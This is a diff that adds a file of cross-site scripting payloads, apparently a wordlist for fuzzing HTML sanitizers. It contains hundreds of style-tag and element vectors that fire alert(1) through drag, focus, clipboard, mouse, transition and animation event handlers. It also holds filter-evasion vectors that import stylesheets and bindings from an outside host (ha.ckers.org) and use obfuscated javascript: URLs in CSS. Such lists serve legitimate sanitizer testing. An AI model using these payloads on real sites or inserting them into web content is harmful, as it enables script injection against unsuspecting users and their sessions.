@@ -1,0 +1,236 @@
+<style draggable="true" ondrag="alert(1)">test</style>
+<style draggable="true" ondragend="alert(1)">test</style>
+<style draggable="true" ondragenter="alert(1)">test</style>
+<style draggable="true" ondragleave="alert(1)">test</style>
+<style draggable="true" ondragstart="alert(1)">test</style>
+<style id=x tabindex=1 onactivate=alert(1)></style>
+<style id=x tabindex=1 onbeforeactivate=alert(1)></style>
+<style id=x tabindex=1 onfocus=alert(1)></style>
+<style id=x tabindex=1 onfocusin=alert(1)></style>
+<style onbeforecopy="alert(1)" contenteditable>test</style>
+<style onbeforecut="alert(1)" contenteditable>test</style>
+<style onbeforepaste="alert(1)" contenteditable>test</style>
+<style onclick="alert(1)">test</style>
+<style oncontextmenu="alert(1)">test</style>
+<style oncopy="alert(1)" contenteditable>test</style>
+<style oncut="alert(1)" contenteditable>test</style>
+<style ondblclick="alert(1)">test</style>
+<style onkeydown="alert(1)" contenteditable>test</style>
+<style onkeypress="alert(1)" contenteditable>test</style>
+<style onkeyup="alert(1)" contenteditable>test</style>
+<style onload=alert(1)></style>
+<style onmousedown="alert(1)">test</style>
+<style onmouseenter="alert(1)">test</style>
+<style onmouseleave="alert(1)">test</style>
+<style onmousemove="alert(1)">test</style>
+<style onmouseout="alert(1)">test</style>
+<style onmouseover="alert(1)">test</style>
+<style onmouseup="alert(1)">test</style>
+<style onpaste="alert(1)" contenteditable>test</style>
+<style onreadystatechange=alert(1)></style>
+<style>:target {color: red;}</style><base id=x style="transition:color 10s" ontransitioncancel=alert(1)></base>
+<style>:target {color: red;}</style><basefont id=x style="transition:color 10s" ontransitioncancel=alert(1)></basefont>
+<style>:target {color: red;}</style><bgsound id=x style="transition:color 10s" ontransitioncancel=alert(1)></bgsound>
+<style>:target {color: red;}</style><isindex id=x style="transition:color 10s" ontransitioncancel=alert(1)></isindex>
+<style>:target {color: red;}</style><style id=x style="transition:color 10s" ontransitioncancel=alert(1)></style>
+<style>:target {color: red;}</style><sub id=x style="transition:color 10s" ontransitioncancel=alert(1)></sub>
+<style>:target {color: red;}</style><summary id=x style="transition:color 10s" ontransitioncancel=alert(1)></summary>
+<style>:target {color: red;}</style><sup id=x style="transition:color 10s" ontransitioncancel=alert(1)></sup>
+<style>:target {color: red;}</style><svg id=x style="transition:color 10s" ontransitioncancel=alert(1)></svg>
+<style>:target {color: red;}</style><table id=x style="transition:color 10s" ontransitioncancel=alert(1)></table>
+<style>:target {color: red;}</style><tbody id=x style="transition:color 10s" ontransitioncancel=alert(1)></tbody>
+<style>:target {color: red;}</style><td id=x style="transition:color 10s" ontransitioncancel=alert(1)></td>
+<style>:target {color: red;}</style><template id=x style="transition:color 10s" ontransitioncancel=alert(1)></template>
+<style>:target {color: red;}</style><textarea id=x style="transition:color 10s" ontransitioncancel=alert(1)></textarea>
+<style>:target {color: red;}</style><tfoot id=x style="transition:color 10s" ontransitioncancel=alert(1)></tfoot>
+<style>:target {color: red;}</style><th id=x style="transition:color 10s" ontransitioncancel=alert(1)></th>
+<style>:target {color: red;}</style><thead id=x style="transition:color 10s" ontransitioncancel=alert(1)></thead>
+<style>:target {color: red;}</style><time id=x style="transition:color 10s" ontransitioncancel=alert(1)></time>
+<style>:target {color: red;}</style><title id=x style="transition:color 10s" ontransitioncancel=alert(1)></title>
+<style>:target {color: red;}</style><tr id=x style="transition:color 10s" ontransitioncancel=alert(1)></tr>
+<style>:target {color: red;}</style><track id=x style="transition:color 10s" ontransitioncancel=alert(1)></track>
+<style>:target {color: red;}</style><tt id=x style="transition:color 10s" ontransitioncancel=alert(1)></tt>
+<style>:target {color: red;}</style><u id=x style="transition:color 10s" ontransitioncancel=alert(1)></u>
+<style>:target {color: red;}</style><ul id=x style="transition:color 10s" ontransitioncancel=alert(1)></ul>
+<style>:target {color: red;}</style><var id=x style="transition:color 10s" ontransitioncancel=alert(1)></var>
+<style>:target {color: red;}</style><video id=x style="transition:color 10s" ontransitioncancel=alert(1)></video>
+<style>:target {color: red;}</style><wbr id=x style="transition:color 10s" ontransitioncancel=alert(1)></wbr>
+<style>:target {color: red;}</style><xmp id=x style="transition:color 10s" ontransitioncancel=alert(1)></xmp>
+<style>:target {color:red;}</style><base id=x style="transition:color 1s" ontransitionend=alert(1)></base>
+<style>:target {color:red;}</style><basefont id=x style="transition:color 1s" ontransitionend=alert(1)></basefont>
+<style>:target {color:red;}</style><bgsound id=x style="transition:color 1s" ontransitionend=alert(1)></bgsound>
+<style>:target {color:red;}</style><isindex id=x style="transition:color 1s" ontransitionend=alert(1)></isindex>
+<style>:target {color:red;}</style><style id=x style="transition:color 1s" ontransitionend=alert(1)></style>
+<style>:target {color:red;}</style><sub id=x style="transition:color 1s" ontransitionend=alert(1)></sub>
+<style>:target {color:red;}</style><summary id=x style="transition:color 1s" ontransitionend=alert(1)></summary>
+<style>:target {color:red;}</style><sup id=x style="transition:color 1s" ontransitionend=alert(1)></sup>
+<style>:target {color:red;}</style><svg id=x style="transition:color 1s" ontransitionend=alert(1)></svg>
+<style>:target {color:red;}</style><table id=x style="transition:color 1s" ontransitionend=alert(1)></table>
+<style>:target {color:red;}</style><tbody id=x style="transition:color 1s" ontransitionend=alert(1)></tbody>
+<style>:target {color:red;}</style><td id=x style="transition:color 1s" ontransitionend=alert(1)></td>
+<style>:target {color:red;}</style><template id=x style="transition:color 1s" ontransitionend=alert(1)></template>
+<style>:target {color:red;}</style><textarea id=x style="transition:color 1s" ontransitionend=alert(1)></textarea>
+<style>:target {color:red;}</style><tfoot id=x style="transition:color 1s" ontransitionend=alert(1)></tfoot>
+<style>:target {color:red;}</style><th id=x style="transition:color 1s" ontransitionend=alert(1)></th>
+<style>:target {color:red;}</style><thead id=x style="transition:color 1s" ontransitionend=alert(1)></thead>
+<style>:target {color:red;}</style><time id=x style="transition:color 1s" ontransitionend=alert(1)></time>
+<style>:target {color:red;}</style><title id=x style="transition:color 1s" ontransitionend=alert(1)></title>
+<style>:target {color:red;}</style><tr id=x style="transition:color 1s" ontransitionend=alert(1)></tr>
+<style>:target {color:red;}</style><track id=x style="transition:color 1s" ontransitionend=alert(1)></track>
+<style>:target {color:red;}</style><tt id=x style="transition:color 1s" ontransitionend=alert(1)></tt>
+<style>:target {color:red;}</style><u id=x style="transition:color 1s" ontransitionend=alert(1)></u>
+<style>:target {color:red;}</style><ul id=x style="transition:color 1s" ontransitionend=alert(1)></ul>
+<style>:target {color:red;}</style><var id=x style="transition:color 1s" ontransitionend=alert(1)></var>
+<style>:target {color:red;}</style><video id=x style="transition:color 1s" ontransitionend=alert(1)></video>
+<style>:target {color:red;}</style><wbr id=x style="transition:color 1s" ontransitionend=alert(1)></wbr>
+<style>:target {color:red;}</style><xmp id=x style="transition:color 1s" ontransitionend=alert(1)></xmp>
+<style>:target {transform: rotate(180deg);}</style><base id=x style="transition:transform 2s" ontransitionrun=alert(1)></base>
+<style>:target {transform: rotate(180deg);}</style><basefont id=x style="transition:transform 2s" ontransitionrun=alert(1)></basefont>
+<style>:target {transform: rotate(180deg);}</style><bgsound id=x style="transition:transform 2s" ontransitionrun=alert(1)></bgsound>
+<style>:target {transform: rotate(180deg);}</style><isindex id=x style="transition:transform 2s" ontransitionrun=alert(1)></isindex>
+<style>:target {transform: rotate(180deg);}</style><style id=x style="transition:transform 2s" ontransitionrun=alert(1)></style>
+<style>:target {transform: rotate(180deg);}</style><sub id=x style="transition:transform 2s" ontransitionrun=alert(1)></sub>
+<style>:target {transform: rotate(180deg);}</style><summary id=x style="transition:transform 2s" ontransitionrun=alert(1)></summary>
+<style>:target {transform: rotate(180deg);}</style><sup id=x style="transition:transform 2s" ontransitionrun=alert(1)></sup>
+<style>:target {transform: rotate(180deg);}</style><svg id=x style="transition:transform 2s" ontransitionrun=alert(1)></svg>
+<style>:target {transform: rotate(180deg);}</style><table id=x style="transition:transform 2s" ontransitionrun=alert(1)></table>
+<style>:target {transform: rotate(180deg);}</style><tbody id=x style="transition:transform 2s" ontransitionrun=alert(1)></tbody>
+<style>:target {transform: rotate(180deg);}</style><td id=x style="transition:transform 2s" ontransitionrun=alert(1)></td>
+<style>:target {transform: rotate(180deg);}</style><template id=x style="transition:transform 2s" ontransitionrun=alert(1)></template>
+<style>:target {transform: rotate(180deg);}</style><textarea id=x style="transition:transform 2s" ontransitionrun=alert(1)></textarea>
+<style>:target {transform: rotate(180deg);}</style><tfoot id=x style="transition:transform 2s" ontransitionrun=alert(1)></tfoot>
+<style>:target {transform: rotate(180deg);}</style><th id=x style="transition:transform 2s" ontransitionrun=alert(1)></th>
+<style>:target {transform: rotate(180deg);}</style><thead id=x style="transition:transform 2s" ontransitionrun=alert(1)></thead>
+<style>:target {transform: rotate(180deg);}</style><time id=x style="transition:transform 2s" ontransitionrun=alert(1)></time>
+<style>:target {transform: rotate(180deg);}</style><title id=x style="transition:transform 2s" ontransitionrun=alert(1)></title>
+<style>:target {transform: rotate(180deg);}</style><tr id=x style="transition:transform 2s" ontransitionrun=alert(1)></tr>
+<style>:target {transform: rotate(180deg);}</style><track id=x style="transition:transform 2s" ontransitionrun=alert(1)></track>
+<style>:target {transform: rotate(180deg);}</style><tt id=x style="transition:transform 2s" ontransitionrun=alert(1)></tt>
+<style>:target {transform: rotate(180deg);}</style><u id=x style="transition:transform 2s" ontransitionrun=alert(1)></u>
+<style>:target {transform: rotate(180deg);}</style><ul id=x style="transition:transform 2s" ontransitionrun=alert(1)></ul>
+<style>:target {transform: rotate(180deg);}</style><var id=x style="transition:transform 2s" ontransitionrun=alert(1)></var>
+<style>:target {transform: rotate(180deg);}</style><video id=x style="transition:transform 2s" ontransitionrun=alert(1)></video>
+<style>:target {transform: rotate(180deg);}</style><wbr id=x style="transition:transform 2s" ontransitionrun=alert(1)></wbr>
+<style>:target {transform: rotate(180deg);}</style><xmp id=x style="transition:transform 2s" ontransitionrun=alert(1)></xmp>
+<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 10s" ontransitioncancel=alert(1)></xss>
+<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=alert(1)></xss>
+<style>@keyframes slidein {}</style><base style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></base>
+<style>@keyframes slidein {}</style><basefont style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></basefont>
+<style>@keyframes slidein {}</style><bgsound style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></bgsound>
+<style>@keyframes slidein {}</style><isindex style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></isindex>
+<style>@keyframes slidein {}</style><style style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></style>
+<style>@keyframes slidein {}</style><sub style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></sub>
+<style>@keyframes slidein {}</style><summary style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></summary>
+<style>@keyframes slidein {}</style><sup style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></sup>
+<style>@keyframes slidein {}</style><svg style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></svg>
+<style>@keyframes slidein {}</style><table style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></table>
+<style>@keyframes slidein {}</style><tbody style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></tbody>
+<style>@keyframes slidein {}</style><td style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></td>
+<style>@keyframes slidein {}</style><template style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></template>
+<style>@keyframes slidein {}</style><textarea style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></textarea>
+<style>@keyframes slidein {}</style><tfoot style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></tfoot>
+<style>@keyframes slidein {}</style><th style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></th>
+<style>@keyframes slidein {}</style><thead style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></thead>
+<style>@keyframes slidein {}</style><time style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></time>
+<style>@keyframes slidein {}</style><title style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></title>
+<style>@keyframes slidein {}</style><tr style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></tr>
+<style>@keyframes slidein {}</style><track style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></track>
+<style>@keyframes slidein {}</style><tt style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></tt>
+<style>@keyframes slidein {}</style><u style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></u>
+<style>@keyframes slidein {}</style><ul style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></ul>
+<style>@keyframes slidein {}</style><var style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></var>
+<style>@keyframes slidein {}</style><video style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></video>
+<style>@keyframes slidein {}</style><wbr style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></wbr>
+<style>@keyframes slidein {}</style><xmp style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xmp>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><base id=x style="position:absolute;" onanimationcancel="alert(1)"></base>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><basefont id=x style="position:absolute;" onanimationcancel="alert(1)"></basefont>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style="position:absolute;" onanimationcancel="alert(1)"></bgsound>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><isindex id=x style="position:absolute;" onanimationcancel="alert(1)"></isindex>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style="position:absolute;" onanimationcancel="alert(1)"></style>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style="position:absolute;" onanimationcancel="alert(1)"></sub>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><summary id=x style="position:absolute;" onanimationcancel="alert(1)"></summary>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style="position:absolute;" onanimationcancel="alert(1)"></sup>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><svg id=x style="position:absolute;" onanimationcancel="alert(1)"></svg>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style="position:absolute;" onanimationcancel="alert(1)"></table>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tbody id=x style="position:absolute;" onanimationcancel="alert(1)"></tbody>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><td id=x style="position:absolute;" onanimationcancel="alert(1)"></td>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><template id=x style="position:absolute;" onanimationcancel="alert(1)"></template>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><textarea id=x style="position:absolute;" onanimationcancel="alert(1)"></textarea>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style="position:absolute;" onanimationcancel="alert(1)"></tfoot>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><th id=x style="position:absolute;" onanimationcancel="alert(1)"></th>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style="position:absolute;" onanimationcancel="alert(1)"></thead>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style="position:absolute;" onanimationcancel="alert(1)"></time>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style="position:absolute;" onanimationcancel="alert(1)"></title>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style="position:absolute;" onanimationcancel="alert(1)"></tr>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><track id=x style="position:absolute;" onanimationcancel="alert(1)"></track>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style="position:absolute;" onanimationcancel="alert(1)"></tt>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style="position:absolute;" onanimationcancel="alert(1)"></u>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ul id=x style="position:absolute;" onanimationcancel="alert(1)"></ul>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><var id=x style="position:absolute;" onanimationcancel="alert(1)"></var>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style="position:absolute;" onanimationcancel="alert(1)"></video>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><wbr id=x style="position:absolute;" onanimationcancel="alert(1)"></wbr>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style="position:absolute;" onanimationcancel="alert(1)"></xmp>
+<style>@keyframes x{}</style><base style="animation-name:x" onanimationend="alert(1)"></base>
+<style>@keyframes x{}</style><base style="animation-name:x" onanimationstart="alert(1)"></base>
+<style>@keyframes x{}</style><basefont style="animation-name:x" onanimationend="alert(1)"></basefont>
+<style>@keyframes x{}</style><basefont style="animation-name:x" onanimationstart="alert(1)"></basefont>
+<style>@keyframes x{}</style><bgsound style="animation-name:x" onanimationend="alert(1)"></bgsound>
+<style>@keyframes x{}</style><bgsound style="animation-name:x" onanimationstart="alert(1)"></bgsound>
+<style>@keyframes x{}</style><isindex style="animation-name:x" onanimationend="alert(1)"></isindex>
+<style>@keyframes x{}</style><isindex style="animation-name:x" onanimationstart="alert(1)"></isindex>
+<style>@keyframes x{}</style><style style="animation-name:x" onanimationend="alert(1)"></style>
+<style>@keyframes x{}</style><style style="animation-name:x" onanimationstart="alert(1)"></style>
+<style>@keyframes x{}</style><sub style="animation-name:x" onanimationend="alert(1)"></sub>
+<style>@keyframes x{}</style><sub style="animation-name:x" onanimationstart="alert(1)"></sub>
+<style>@keyframes x{}</style><summary style="animation-name:x" onanimationend="alert(1)"></summary>
+<style>@keyframes x{}</style><summary style="animation-name:x" onanimationstart="alert(1)"></summary>
+<style>@keyframes x{}</style><sup style="animation-name:x" onanimationend="alert(1)"></sup>
+<style>@keyframes x{}</style><sup style="animation-name:x" onanimationstart="alert(1)"></sup>
+<style>@keyframes x{}</style><svg style="animation-name:x" onanimationend="alert(1)"></svg>
+<style>@keyframes x{}</style><svg style="animation-name:x" onanimationstart="alert(1)"></svg>
+<style>@keyframes x{}</style><table style="animation-name:x" onanimationend="alert(1)"></table>
+<style>@keyframes x{}</style><table style="animation-name:x" onanimationstart="alert(1)"></table>
+<style>@keyframes x{}</style><tbody style="animation-name:x" onanimationend="alert(1)"></tbody>
+<style>@keyframes x{}</style><tbody style="animation-name:x" onanimationstart="alert(1)"></tbody>
+<style>@keyframes x{}</style><td style="animation-name:x" onanimationend="alert(1)"></td>
+<style>@keyframes x{}</style><td style="animation-name:x" onanimationstart="alert(1)"></td>
+<style>@keyframes x{}</style><template style="animation-name:x" onanimationend="alert(1)"></template>
+<style>@keyframes x{}</style><template style="animation-name:x" onanimationstart="alert(1)"></template>
+<style>@keyframes x{}</style><textarea style="animation-name:x" onanimationend="alert(1)"></textarea>
+<style>@keyframes x{}</style><textarea style="animation-name:x" onanimationstart="alert(1)"></textarea>
+<style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationend="alert(1)"></tfoot>
+<style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationstart="alert(1)"></tfoot>
+<style>@keyframes x{}</style><th style="animation-name:x" onanimationend="alert(1)"></th>
+<style>@keyframes x{}</style><th style="animation-name:x" onanimationstart="alert(1)"></th>
+<style>@keyframes x{}</style><thead style="animation-name:x" onanimationend="alert(1)"></thead>
+<style>@keyframes x{}</style><thead style="animation-name:x" onanimationstart="alert(1)"></thead>
+<style>@keyframes x{}</style><time style="animation-name:x" onanimationend="alert(1)"></time>
+<style>@keyframes x{}</style><time style="animation-name:x" onanimationstart="alert(1)"></time>
+<style>@keyframes x{}</style><title style="animation-name:x" onanimationend="alert(1)"></title>
+<style>@keyframes x{}</style><title style="animation-name:x" onanimationstart="alert(1)"></title>
+<style>@keyframes x{}</style><tr style="animation-name:x" onanimationend="alert(1)"></tr>
+<style>@keyframes x{}</style><tr style="animation-name:x" onanimationstart="alert(1)"></tr>
+<style>@keyframes x{}</style><track style="animation-name:x" onanimationend="alert(1)"></track>
+<style>@keyframes x{}</style><track style="animation-name:x" onanimationstart="alert(1)"></track>
+<style>@keyframes x{}</style><tt style="animation-name:x" onanimationend="alert(1)"></tt>
+<style>@keyframes x{}</style><tt style="animation-name:x" onanimationstart="alert(1)"></tt>
+<style>@keyframes x{}</style><u style="animation-name:x" onanimationend="alert(1)"></u>
+<style>@keyframes x{}</style><u style="animation-name:x" onanimationstart="alert(1)"></u>
+<style>@keyframes x{}</style><ul style="animation-name:x" onanimationend="alert(1)"></ul>
+<style>@keyframes x{}</style><ul style="animation-name:x" onanimationstart="alert(1)"></ul>
+<style>@keyframes x{}</style><var style="animation-name:x" onanimationend="alert(1)"></var>
+<style>@keyframes x{}</style><var style="animation-name:x" onanimationstart="alert(1)"></var>
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="alert(1)"></video>
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationstart="alert(1)"></video>
+<style>@keyframes x{}</style><wbr style="animation-name:x" onanimationend="alert(1)"></wbr>
+<style>@keyframes x{}</style><wbr style="animation-name:x" onanimationstart="alert(1)"></wbr>
+<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationend="alert(1)"></xmp>
+<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationstart="alert(1)"></xmp>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
